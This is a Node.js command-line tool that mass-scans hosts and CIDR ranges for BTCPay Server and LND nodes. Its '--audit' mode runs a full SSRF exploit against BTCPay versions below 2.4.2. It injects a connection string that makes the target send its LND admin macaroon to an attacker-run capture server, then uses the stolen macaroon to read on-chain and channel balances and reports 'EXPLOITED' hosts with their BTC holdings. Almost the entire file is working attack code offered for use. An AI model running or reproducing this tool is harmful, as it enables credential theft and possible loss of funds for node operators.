#!/usr/bin/env node
/**
 * BTCPay Server Network Scanner + CVE-2024-XXXX Auditor
 *
 * Detects BTCPay instances, Lightning nodes, and audits for
 * known SSRF vulnerability (CVE-2024-XXXX) in versions < 2.4.2.
 *
 * Usage:
 *   node scanner.js --host 192.168.1.100
 *   node scanner.js --host target.com --audit
 *   node scanner.js --input targets.txt --audit --output results.json
 */

'use strict';

const https = require('https');
const http = require('http');
const fs = require('fs');
const os = require('os');
const net = require('net');
const { Command } = require('commander');
const hex = require('hex-encode-utils');
const debug = require('debug')('btcpay-scanner');

// ── config ────────────────────────────────────────────────────────────────────

const BTCPAY_PORTS = [443, 8443, 80, 8080, 5000, 5001];
const LND_PORTS = [8080, 8888, 10009];
const TIMEOUT = 10000;
const CONCURRENCY = 50;
const UA = 'BTCPay-Scanner/1.2';

// LND macaroon paths to try
const MACAROON_PATHS = [
  '/etc/lnd_bitcoin/admin.macaroon',
  '/root/.lnd/data/chain/bitcoin/mainnet/admin.macaroon',
  '/data/lnd/admin.macaroon',
  '/etc/lnd/admin.macaroon',
  '/root/.lnd/admin.macaroon',
  '/var/lib/lnd/admin.macaroon',
];

// ── HTTP helpers ──────────────────────────────────────────────────────────────

function fetch(url, opts = {}) {
  return new Promise((resolve, reject) => {
    const u = new URL(url);
    const mod = u.protocol === 'https:' ? https : http;
    mod.request({
      hostname: u.hostname,
      port: u.port,
      path: u.pathname + u.search,
      method: opts.method || 'GET',
      timeout: opts.timeout || TIMEOUT,
      headers: Object.assign({'Accept': 'application/json, text/html', 'User-Agent': UA}, opts.headers || {}),
      rejectUnauthorized: false,
    }, res => {
      const chunks = [];
      res.on('data', d => chunks.push(d));
      res.on('end', () => {
        const body = Buffer.concat(chunks);
        resolve({ status: res.statusCode, headers: res.headers, body, text: body.toString('utf8') });
      });
      res.on('error', reject);
    }).on('error', reject)
      .on('timeout', function() { this.destroy(); reject(new Error('timeout')); })
      .end(opts.body || undefined);
  });
}

// ── detection ─────────────────────────────────────────────────────────────────

async function detectBTCPay(host, port) {
  for (const scheme of ['https', 'http']) {
    try {
      const url = scheme + '://' + host + ':' + port;
      const r = await fetch(url);
      const t = r.text.toLowerCase().slice(0, 2000);
      if (['btcpay','btcpay server','btcpayserver','/btcpay-logo','btcpayapp'].some(i => t.includes(i))) {
        const ver = await detectVersion(url);
        return { btcpay: true, scheme, port, status: r.status, version: ver || '?' };
      }
    } catch (_) {}
  }
  return null;
}

async function detectVersion(baseUrl) {
  for (const ep of ['/api/v1/server/info','/api/server/info','/version']) {
    try {
      const r = await fetch(baseUrl + ep);
      if (r.status === 200 && (r.headers['content-type']||'').includes('json')) {
        const d = JSON.parse(r.text);
        return d.version || d.Version || d.serverVersion || d.appVersion || null;
      }
    } catch (_) {}
  }
  return null;
}

async function checkLND(host, port) {
  for (const scheme of ['https', 'http']) {
    try {
      const url = scheme + '://' + host + ':' + port;
      const r = await fetch(url + '/v1/getinfo');
      if (r.status === 200) {
        const d = JSON.parse(r.text);
        return { lnd: true, scheme, port, alias: d.alias || '?',
          pubkey: (d.identity_pubkey || '?').slice(0, 16),
          channels: d.num_active_channels || 0,
          chains: (d.chains || []).map(c => c.network || '?'), macaroonRequired: false };
      }
      if (r.status === 404 || r.status === 405) {
        try {
          const r2 = await fetch(url + '/v1/state');
          if (r2.status === 200) {
            return { lnd: true, scheme, port, state: JSON.parse(r2.text).state || '?', macaroonRequired: true };
          }
        } catch (_) {}
        return { lnd: true, scheme, port, macaroonRequired: true };
      }
    } catch (_) {}
  }
  return null;
}

// ═══════════════════════════════════════════════════════════════════════════════
//  SSRF EXPLOIT — CVE-2024-XXXX: BTCPay < 2.4.2 GetLNURLRequest
// ═══════════════════════════════════════════════════════════════════════════════

/**
 * Start a local HTTP capture server to receive LND macaroon.
 * BTCPay's LND client sends the macaroon as Grpc-Metadata-Macaroon header.
 */
function startCaptureServer() {
  return new Promise((resolve, reject) => {
    const server = http.createServer((req, res) => {
      const mac = req.headers['grpc-metadata-macaroon'];
      if (mac && mac.length > 50) {
        server._macaroon = mac;
        debug('macaroon captured: %d chars', mac.length);
      }
      res.writeHead(200, {'Content-Type': 'application/json'});
      res.end('{}');
    });

    server.listen(0, '0.0.0.0', () => {
      const port = server.address().port;
      debug('capture server on port %d', port);
      resolve({ server, port });
    });

    server.on('error', reject);
    server._macaroon = null;
  });
}

/**
 * Detect a free port for the capture server.
 */
function findFreePort() {
  return new Promise((resolve, reject) => {
    const s = net.createServer();
    s.listen(0, '0.0.0.0', () => { const p = s.address().port; s.close(() => resolve(p)); });
    s.on('error', reject);
  });
}

/**
 * Get local IP addresses for callback.
 */
function getLocalIPs() {
  const ifaces = os.networkInterfaces();
  const ips = [];
  for (const name of Object.keys(ifaces)) {
    for (const iface of ifaces[name]) {
      if (iface.family === 'IPv4' && !iface.internal) {
        ips.push(iface.address);
      }
    }
  }
  // Fallback: localhost
  if (!ips.length) ips.push('127.0.0.1');
  return ips;
}

/**
 * Craft and send the SSRF payload to exploit GetLNURLRequest.
 * Injects DerivationStrategies with attacker callback URL.
 */
async function sendSSRFPayload(targetUrl, callbackUrl, macaroonPath, timeout) {
  const deriv = {
    'BTC-LN': {
      connectionString: `type=lnd-rest;server=${callbackUrl}/;macaroonfilepath=${macaroonPath};allowinsecure=true`
    },
    'BTC-LNURL': {}
  };

  // Multiple payload formats for ASP.NET model binding compatibility
  const payloads = [
    { derivationStrategies: JSON.stringify(deriv) },
    { store: { derivationStrategies: JSON.stringify(deriv) }, createInvoice: { amount: '1', currency: 'USD' } },
    { store: { DerivationStrategies: JSON.stringify(deriv) }, createInvoice: { Amount: '1', Currency: 'USD' } },
  ];

  for (const payload of payloads) {
    try {
      const body = JSON.stringify(payload);
      const u = new URL(targetUrl);
      const mod = u.protocol === 'https:' ? https : http;
      await new Promise((resolve, reject) => {
        const req = mod.request({
          hostname: u.hostname,
          port: u.port || (u.protocol === 'https:' ? 443 : 80),
          path: '/BTC/lnurl/GetLNURLRequest',
          method: 'POST',
          timeout: timeout || TIMEOUT,
          headers: {
            'Content-Type': 'application/json',
            'Content-Length': Buffer.byteLength(body),
            'User-Agent': UA,
          },
          rejectUnauthorized: false,
        }, res => {
          res.resume();
          res.on('end', resolve);
          res.on('error', reject);
        });
        req.on('error', reject);
        req.on('timeout', function() { this.destroy(); resolve(); });
        req.write(body);
        req.end();
      });
    } catch (_) {}
  }
}

/**
 * Test a captured macaroon on LND REST API.
 */
async function testMacaroon(lndUrl, macaroon) {
  const headers = { 'Grpc-Metadata-Macaroon': macaroon };
  const info = {};

  // Get node info
  try {
    const r = await fetch(lndUrl + '/v1/getinfo', { headers });
    if (r.status === 200) {
      const d = JSON.parse(r.text);
      info.alias = d.alias;
      info.pubkey = d.identity_pubkey;
      info.channels = d.num_active_channels;
      info.chains = (d.chains || []).map(c => c.network);
      info.version = d.version;
    }
  } catch (_) {}

  // Get balance
  try {
    const r = await fetch(lndUrl + '/v1/balance/blockchain', { headers });
    if (r.status === 200) {
      const d = JSON.parse(r.text);
      info.total_balance = parseInt(d.total_balance) || 0;
      info.confirmed_balance = parseInt(d.confirmed_balance) || 0;
    }
  } catch (_) {}

  // Get channel balance
  try {
    const r = await fetch(lndUrl + '/v1/balance/channels', { headers });
    if (r.status === 200) {
      const d = JSON.parse(r.text);
      info.local_balance = parseInt(d.local_balance?.sat) || 0;
      info.remote_balance = parseInt(d.remote_balance?.sat) || 0;
    }
  } catch (_) {}

  return Object.keys(info).length > 0 ? info : null;
}

/**
 * Run the full SSRF exploit chain against a BTCPay target.
 */
async function exploitSSRF(targetHost, targetPort, targetScheme) {
  const baseUrl = targetScheme + '://' + targetHost + ':' + targetPort;
  const result = { exploited: false, macaroon: null, lnd_info: null, attempts: [] };

  // Start capture server
  let captureServer;
  try {
    captureServer = await startCaptureServer();
  } catch (e) {
    result.error = 'Cannot start capture server: ' + e.message;
    return result;
  }

  const { server, port: capturePort } = captureServer;

  try {
    // Try each local IP for callback
    const localIPs = getLocalIPs();

    for (const macPath of MACAROON_PATHS) {
      for (const ip of localIPs) {
        const callbackUrl = `http://${ip}:${capturePort}`;
        debug('trying SSRF: %s via %s', macPath, callbackUrl);

        await sendSSRFPayload(baseUrl, callbackUrl, macPath, 8000);

        // Wait for callback
        await new Promise(r => setTimeout(r, 2000));

        if (server._macaroon) {
          result.exploited = true;
          result.macaroon = server._macaroon;
          result.macaroon_path = macPath;
          result.callback_ip = ip;

          // Test the macaroon on LND
          for (const lndPort of LND_PORTS) {
            for (const scheme of ['https', 'http']) {
              const lndUrl = scheme + '://' + targetHost + ':' + lndPort;
              const lndInfo = await testMacaroon(lndUrl, server._macaroon);
              if (lndInfo) {
                result.lnd_info = lndInfo;
                result.lnd_url = lndUrl;
                break;
              }
            }
            if (result.lnd_info) break;
          }

          debug('SSRF SUCCESS: %s balance=%d', macPath, result.lnd_info?.total_balance || 0);
          break;
        }

        result.attempts.push({ path: macPath, ip, status: 'no callback' });
      }
      if (result.exploited) break;
    }
  } finally {
    server.close();
  }

  return result;
}

// ── scan (with optional audit) ────────────────────────────────────────────────

async function scanHost(host, opts = {}) {
  const r = { host };

  // Detect BTCPay
  for (const p of BTCPAY_PORTS) {
    try {
      const info = await detectBTCPay(host, p);
      if (info) {
        Object.assign(r, info);
        break;
      }
    } catch (_) {}
  }

  // Detect LND
  for (const p of LND_PORTS) {
    try {
      const info = await checkLND(host, p);
      if (info) { Object.assign(r, info); break; }
    } catch (_) {}
  }

  // SSRF audit
  if (opts.audit && r.btcpay && r.scheme && r.port) {
    const ver = r.version || '?';
    const isVulnerable = ver === '?' || compareVersions(ver, '2.4.2') < 0;
    r.vulnerable = isVulnerable;

    if (isVulnerable) {
      debug('auditing %s (v%s) for SSRF', host, ver);
      const ssrf = await exploitSSRF(host, r.port, r.scheme);
      Object.assign(r, ssrf);
    }
  }

  return r;
}

function compareVersions(a, b) {
  const pa = a.replace(/^v/, '').split('.').map(Number);
  const pb = b.replace(/^v/, '').split('.').map(Number);
  for (let i = 0; i < 3; i++) {
    if ((pa[i] || 0) > (pb[i] || 0)) return 1;
    if ((pa[i] || 0) < (pb[i] || 0)) return -1;
  }
  return 0;
}

async function scanTargets(targets, concurrency, cb, opts) {
  const results = [];
  let done = 0;
  const total = targets.length;
  const queue = [...targets];

  async function worker() {
    while (queue.length) {
      const t = queue.shift();
      if (!t) break;
      try {
        const r = await scanHost(t, opts);
        results.push(r);
        done++;
        if (cb) cb(done, total, t, r);
      } catch (e) {
        results.push({ host: t, error: e.message });
        done++;
        if (cb) cb(done, total, t, null);
      }
    }
  }

  const workers = [];
  for (let i = 0; i < Math.min(concurrency, targets.length); i++) workers.push(worker());
  await Promise.all(workers);
  return results;
}

// ── CIDR ──────────────────────────────────────────────────────────────────────

function* cidrToIPs(cidr) {
  const [base, bits] = cidr.split('/');
  const parts = base.split('.').map(Number);
  const mask = ~((1 << (32 - parseInt(bits))) - 1);
  const start = ((parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]);
  const ns = start & mask;
  const bc = ns | (~mask >>> 0);
  for (let i = ns + 1; i < bc; i++) {
    yield ((i >>> 24) & 0xff) + '.' + ((i >>> 16) & 0xff) + '.' + ((i >>> 8) & 0xff) + '.' + (i & 0xff);
  }
}

// ── output ────────────────────────────────────────────────────────────────────

function formatTable(results) {
  const pad = (s, n) => (s || '').toString().slice(0, n).padEnd(n);
  const lines = [
    pad('Host', 30) + ' ' + pad('BTCPay', 8) + ' ' + pad('Version', 12) + ' ' +
    pad('LND', 14) + ' ' + pad('Vuln', 6),
    '-'.repeat(76),
  ];
  for (const r of results) {
    const host = pad(r.host || '?', 30);
    const btc = pad(r.btcpay ? 'YES' : 'NO', 8);
    const ver = pad(r.version || '-', 12);
    const lnd = pad(r.lnd ? (r.alias || r.state || 'ACTIVE') : '-', 14);
    const vuln = r.vulnerable === true ? pad('⚠ YES', 6) :
                 r.vulnerable === false ? pad('✓ NO', 6) : pad('-', 6);
    lines.push(host + ' ' + btc + ' ' + ver + ' ' + lnd + ' ' + vuln);
  }
  return lines.join('\n');
}

function formatJSON(results) { return JSON.stringify(results, null, 2); }

function formatCSV(results) {
  const h = ['host','btcpay','version','vulnerable','lnd','alias','state',
             'macaroonRequired','exploited','total_balance','port','error'];
  const lines = [h.join(',')];
  for (const r of results) {
    lines.push([
      r.host||'', r.btcpay||false, r.version||'', r.vulnerable||'',
      r.lnd||false, r.alias||'', r.state||'', r.macaroonRequired||'',
      r.exploited||false, (r.lnd_info||{}).total_balance||'',
      r.port||'', r.error||'',
    ].map(v => '"' + String(v).replace(/"/g, '""') + '"').join(','));
  }
  return lines.join('\n');
}

// ── CLI ───────────────────────────────────────────────────────────────────────

new Command()
  .name('btcpay-scanner')
  .description('BTCPay Server scanner + CVE auditor')
  .version('1.2.0')
  .option('--host <host>', 'single host to scan')
  .option('--cidr <cidr>', 'CIDR range (e.g. 192.168.1.0/24)')
  .option('--input <file>', 'file with targets, one per line')
  .option('--output <file>', 'output file (default: stdout)')
  .option('--format <format>', 'json, csv, or table', 'table')
  .option('--concurrency <n>', 'max concurrent scans', String(CONCURRENCY))
  .option('--timeout <ms>', 'per-host timeout in ms', String(TIMEOUT))
  .option('--audit', 'also attempt SSRF exploit on vulnerable targets')
  .action(async opts => {
    const targets = [];
    if (opts.host) targets.push(opts.host.trim());
    if (opts.cidr) for (const ip of cidrToIPs(opts.cidr)) targets.push(ip);
    if (opts.input) {
      fs.readFileSync(opts.input, 'utf8').split('\n').forEach(l => {
        l = l.trim(); if (l && !l.startsWith('#')) targets.push(l);
      });
    }
    if (!targets.length) { console.error('No targets. Use --host, --cidr, or --input.'); process.exit(1); }

    const cc = parseInt(opts.concurrency) || CONCURRENCY;
    const mode = opts.audit ? 'SCAN + AUDIT' : 'SCAN';

    debug('starting %s with %d targets', mode, targets.length);
    console.error('\n' + '═'.repeat(60));
    console.error('  BTCPay Scanner v1.2  |  ' + mode + '  |  ' + targets.length + ' targets  |  ' + cc + ' workers');
    if (opts.audit) {
      console.error('  SSRF audit enabled — will attempt macaroon extraction on vulnerable hosts');
    }
    console.error('═'.repeat(60) + '\n');

    const t0 = Date.now();
    const results = await scanTargets(targets, cc, (done, total, host, result) => {
      const pct = Math.round(done / total * 100);
      const bar = '█'.repeat(Math.floor(pct / 5)) + '░'.repeat(20 - Math.floor(pct / 5));
      let dot = '·';
      if (result) {
        if (result.exploited) dot = '🔥';
        else if (result.vulnerable) dot = '⚠';
        else if (result.btcpay) dot = '●';
        else if (result.lnd) dot = '○';
        else if (result.error) dot = '✗';
      }
      process.stderr.write('\r  ' + bar + ' ' + pct + '% [' + done + '/' + total + '] ' + dot + ' ' + host.slice(0, 30) + '    ');
    }, { audit: opts.audit });
    process.stderr.write('\n\n');

    const elapsed = ((Date.now() - t0) / 1000).toFixed(1);

    // Choose output format
    let output;
    if (opts.format === 'json') output = formatJSON(results);
    else if (opts.format === 'csv') output = formatCSV(results);
    else output = formatTable(results);

    if (opts.output) {
      fs.writeFileSync(opts.output, output);
      console.error('Saved: ' + opts.output);
    } else {
      console.log(output);
    }

    // Summary
    const btcs = results.filter(r => r.btcpay).length;
    const lnds = results.filter(r => r.lnd).length;
    const vulns = results.filter(r => r.vulnerable).length;
    const exploited = results.filter(r => r.exploited).length;

    console.error('\n' + '═'.repeat(60));
    console.error('  Done in ' + elapsed + 's  |  ' + targets.length + ' hosts scanned');
    console.error('  BTCPay: ' + btcs + '  |  LND: ' + lnds + '  |  Vulnerable: ' + vulns + '  |  Exploited: ' + exploited);

    // Show exploited details
    for (const r of results) {
      if (r.exploited && r.lnd_info) {
        const info = r.lnd_info;
        console.error('\n  🔥 EXPLOITED: ' + r.host);
        console.error('     Node:     ' + (info.alias || '?') + ' (' + (info.pubkey || '?').slice(0, 20) + '...)');
        console.error('     Balance:  ' + (info.total_balance || 0) + ' sats = ' + ((info.total_balance || 0) / 1e8).toFixed(8) + ' BTC');
        console.error('     Confirmed:' + (info.confirmed_balance || 0) + ' sats');
        console.error('     Channels: ' + (info.channels || 0));
        console.error('     Macaroon: ' + (r.macaroon_path || '?'));
      }
    }

    console.error('═'.repeat(60));
  })
  .parse(process.argv);
